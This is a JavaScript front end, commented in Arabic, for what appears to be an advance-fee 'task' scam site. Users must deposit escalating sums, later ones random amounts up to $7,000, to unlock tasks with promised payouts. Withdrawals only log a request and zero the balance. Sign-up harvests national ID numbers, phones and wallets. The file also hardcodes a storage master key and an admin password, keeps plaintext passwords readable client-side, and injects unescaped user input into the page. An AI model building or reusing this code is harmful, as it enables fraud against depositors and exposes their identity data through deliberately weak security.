// ==== إعداد Bin.io ====
const BIN_ID = "6924db89d0ea881f40fde913"; 
const MASTER_KEY = "$2a$10$k7UNDXuzwGDFt8SlvSm02.DfIHhcwx5A/IurS6k0..aiZ8aLYkVz2";

// ==== معلومات الأدمن ====
const ADMIN_EMAIL = "admin25";
const ADMIN_PASS = "25802580";

// ===== جلب البيانات من BIN =====
async function fetchBin() {
  try {
    const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
      headers: { "X-Master-Key": MASTER_KEY }
    });
    const data = await res.json();
    return data.record;
  } catch {
    return { users: [] };
  }
}

async function saveBin(record) {
  await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
    method: "PUT",
    headers: {
      "Content-Type": "application/json",
      "X-Master-Key": MASTER_KEY
    },
    body: JSON.stringify(record)
  });
}

// ===== المتغيرات الأساسية =====
let currentUser = null;
let allUsers = [];

// ===== تحميل البيانات =====
async function loadData() {
  const data = await fetchBin();
  allUsers = data.users || [];

  // استرجاع جلسة مستخدم مسجل دخول
  const logged = allUsers.find(u => u.loggedIn && u.email !== ADMIN_EMAIL);
  if (logged) currentUser = logged;

  currentUser ? homePage() : loginPage();
}

// ===== تحديث بيانات المستخدم =====
async function updateUser() {
  if (!currentUser) return;

  const i = allUsers.findIndex(u => u.email === currentUser.email);
  if (i !== -1) allUsers[i] = currentUser;
  else allUsers.push(currentUser);

  await saveBin({ users: allUsers });
  updateHeaderBalance();
}

// ===== تحديث رصيد الهيدر =====
function updateHeaderBalance() {
  if (currentUser)
    document.getElementById("balanceDisplay").innerText = currentUser.balance;
}

// ===== عرض الهيدر =====
function showHeader(show) {
  document.getElementById("header").style.display = show ? "flex" : "none";
}

// ===== شاشة تسجيل الدخول =====
function loginPage() {
  showHeader(false);
  document.getElementById("app").innerHTML = `
    <div class="container"><div class="box">
      <h2>تسجيل الدخول</h2>
      <input id="loginEmail" placeholder="البريد الإلكتروني">
      <input id="loginPass" type="password" placeholder="كلمة المرور">
      <button onclick="login()">دخول</button>
      <button onclick="registerPage()" style="background:#444;color:white;">إنشاء حساب</button>
    </div></div>`;
}

// ===== شاشة إنشاء الحساب =====
function registerPage() {
  showHeader(false);
  document.getElementById("app").innerHTML = `
    <div class="container"><div class="box">
      <h2>إنشاء حساب</h2>
      <input id="regName" placeholder="الاسم الكامل">
      <input id="regEmail" placeholder="البريد الإلكتروني">
      <input id="regNID" placeholder="الرقم الوطني">
      <input id="regPhone" placeholder="رقم الهاتف">
      <select id="regCountry">
        <option value="+963">سوريا +963</option>
        <option value="+90">تركيا +90</option>
      </select>
      <input id="regPass" type="password" placeholder="كلمة المرور">
      <button onclick="register()">تسجيل</button>
      <button onclick="loginPage()" style="background:#444;color:white;">رجوع</button>
    </div></div>`;
}

// ===== إنشاء الحساب =====
function register() {
  let name = regName.value;
  let email = regEmail.value;
  let nid = regNID.value;
  let phone = regPhone.value;
  let country = regCountry.value;
  let pass = regPass.value;

  if (!name || !email || !nid || !phone || !pass) {
    return alert("يرجى ملء جميع الحقول");
  }

  // منع إنشاء حساب باسم الأدمن
  if (email === ADMIN_EMAIL) {
    return alert("هذا الحساب محجوز للإدارة فقط.");
  }

  currentUser = {
    name, email, nid, phone, country, pass,
    balance: 0,
    tasksCompleted: 0,
    taskDeposits: Array(25).fill(0),
    depositRequests: [],
    withdrawRequests: [],
    loggedIn: true
  };

  allUsers.push(currentUser);
  updateUser();
  homePage();
}

// ===== تسجيل الدخول =====
async function login() {
  let email = loginEmail.value;
  let pass = loginPass.value;

  // دخول الأدمن
  if (email === ADMIN_EMAIL && pass === ADMIN_PASS) {
    currentUser = { email: ADMIN_EMAIL, isAdmin: true };
    adminPanel();
    return;
  }

  // دخول المستخدم
  let user = allUsers.find(u => u.email === email && u.pass === pass);
  if (!user) return alert("بيانات خاطئة");

  user.loggedIn = true;
  currentUser = user;

  await updateUser();
  homePage();
}

// ===== الصفحة الرئيسية =====
function homePage() {
  if (!currentUser || currentUser.isAdmin) return loginPage();

  showHeader(true);
  updateHeaderBalance();

  let tasks = "";
  for (let i = 0; i < 25; i++) {
    let dep, rew;

    if (i < 15) {
      dep = 10 * (i + 1) * 2;
      rew = dep * 2;
    } else {
      dep = Math.floor(Math.random() * 7000) + 500;
      rew = dep + Math.floor(dep * 0.5);
    }

    if (!currentUser.taskDeposits[i]) currentUser.taskDeposits[i] = 0;

    let locked = currentUser.taskDeposits[i] < dep || currentUser.tasksCompleted < i;
    let done = currentUser.tasksCompleted > i;

    tasks += `
      <div class="task ${locked ? 'locked' : ''}">
        <h3>المهمة ${i + 1}</h3>
        <p>الإيداع: ${dep}$</p>
        <p>الربح: ${rew}$</p>
        <p>الحالة: ${done ? "تم الإنجاز" : locked ? "مقفلة" : "جاهزة"}</p>
        <button ${locked || done ? "disabled" : ""} onclick="openTask(${i},${dep},${rew})">تنفيذ</button>
      </div>`;
  }

  document.getElementById("app").innerHTML = `<div class="container">${tasks}</div>`;
}

// ===== فتح المهمة =====
function openTask(i, dep, rew) {
  document.getElementById("app").innerHTML = `
    <div class="container"><div class="box">
      <h2>المهمة ${i + 1}</h2>
      <p>إيداع مطلوب: ${dep}$</p>
      <p>ربح: ${rew}$</p>
      <button onclick="executeTask(${i},${dep},${rew})">تنفيذ</button>
      <button class="back-btn" onclick="homePage()">رجوع</button>
    </div></div>`;
}

function executeTask(i, dep, rew) {
  if (currentUser.taskDeposits[i] < dep)
    return alert(`يجب إيداع ${dep}$ قبل التنفيذ`);

  currentUser.balance += rew;
  currentUser.tasksCompleted = Math.max(currentUser.tasksCompleted, i + 1);
  updateUser();
  alert("تمت المهمة 🎉");
  homePage();
}

// ===== صفحة الإيداع =====
function depositPage() {
  document.getElementById("app").innerHTML = `
    <div class="container"><div class="box">
      <h2>إيداع</h2>
      <input id="depositAmount" placeholder="المبلغ">
      <input id="depositImg" type="file">
      <button onclick="submitDeposit()">إرسال</button>
      <button class="back-btn" onclick="homePage()">رجوع</button>
    </div></div>`;
}

function submitDeposit() {
  let amount = depositAmount.value;
  let img = depositImg.files[0];
  if (!amount || !img) return alert("أدخل المبلغ والصورة");

  let r = new FileReader();
  r.onload = () => {
    currentUser.depositRequests.push({
      amount: parseFloat(amount),
      image: r.result,
      date: new Date().toLocaleString()
    });
    updateUser();
    alert("تم إرسال الطلب");
    homePage();
  };
  r.readAsDataURL(img);
}

// ===== سحب =====
function withdrawPage() {
  document.getElementById("app").innerHTML = `
    <div class="container"><div class="box">
      <h2>سحب</h2>
      <p>رصيدك: ${currentUser.balance}$</p>
      <input id="withdrawWallet" placeholder="محفظتك">
      <button onclick="submitWithdraw()">إرسال</button>
      <button onclick="homePage()" class="back-btn">رجوع</button>
    </div></div>`;
}

function submitWithdraw() {
  let w = withdrawWallet.value;
  if (!w) return alert("أدخل المحفظة");

  currentUser.withdrawRequests.push({
    wallet: w,
    amount: currentUser.balance,
    date: new Date().toLocaleString()
  });

  currentUser.balance = 0;
  updateUser();
  alert("تم إرسال طلب السحب");
  homePage();
}

// ===== صفحة الحساب =====
function accountPage() {
  document.getElementById("app").innerHTML = `
    <div class="container"><div class="box">
      <h2>الملف الشخصي</h2>
      ${renderField("name", "الاسم")}
      ${renderField("email", "البريد")}
      ${renderField("phone", "الهاتف")}
      ${renderField("country", "الدولة")}
      ${renderField("nid", "الرقم الوطني")}
      <p><b>الرصيد:</b> ${currentUser.balance}$</p>
      <button class="back-btn" onclick="homePage()">رجوع</button>
    </div></div>`;
}

function renderField(key, label) {
  return `
    <p><b>${label}:</b> <span id="field-${key}">${currentUser[key]}</span>
    <i class="fa-solid fa-pen" onclick="editField('${key}')"></i></p>`;
}

function editField(key) {
  let span = document.getElementById(`field-${key}`);
  let old = span.innerText;
  span.innerHTML = `<input id="inp-${key}" value="${old}"> <button onclick="saveField('${key}')">حفظ</button>`;
}

async function saveField(key) {
  currentUser[key] = document.getElementById(`inp-${key}`).value;
  await updateUser();
  accountPage();
}

// ===== لوحة الإدارة =====
function adminLogin() {
  if (!currentUser || !currentUser.isAdmin) {
    alert("غير مسموح");
    return loginPage();
  }
  adminPanel();
}

function adminPanel() {
  showHeader(false);

  let html = "";

  allUsers
    .filter(u => u.email !== ADMIN_EMAIL)
    .forEach(u => {
      u.depositRequests.forEach((r, i) => {
        html += `
        <div class="admin-request">
          <p><b>${u.name}</b> (${u.email})</p>
          <p>مبلغ: ${r.amount}$</p>
          <img src="${r.image}" style="max-width:200px;">
          <button onclick="approveDeposit('${u.email}',${i})">قبول</button>
          <button style="background:red;" onclick="rejectDeposit('${u.email}',${i})">رفض</button>
        </div>`;
      });
    });

  document.getElementById("app").innerHTML = `
    <div class="container"><div class="admin-box">
      <h2>طلبات الإيداع</h2>
      ${html || "<p>لا يوجد طلبات</p>"}
      <button class="back-btn" onclick="logout()">خروج الأدمن</button>
    </div></div>`;
}

async function approveDeposit(email, index) {
  let u = allUsers.find(x => x.email === email);
  if (!u) return;

  let req = u.depositRequests[index];
  let nextTask = u.tasksCompleted;

  u.taskDeposits[nextTask] += req.amount;
  u.depositRequests.splice(index, 1);

  await saveBin({ users: allUsers });

  adminPanel();
}

async function rejectDeposit(email, index) {
  let u = allUsers.find(x => x.email === email);
  if (!u) return;

  u.depositRequests.splice(index, 1);

  await saveBin({ users: allUsers });

  adminPanel();
}

// ===== تسجيل خروج =====
async function logout() {
  if (currentUser && !currentUser.isAdmin) {
    currentUser.loggedIn = false;
    await updateUser();
  }

  currentUser = null;
  loginPage();
}

// ===== بدء التشغيل =====
loadData();
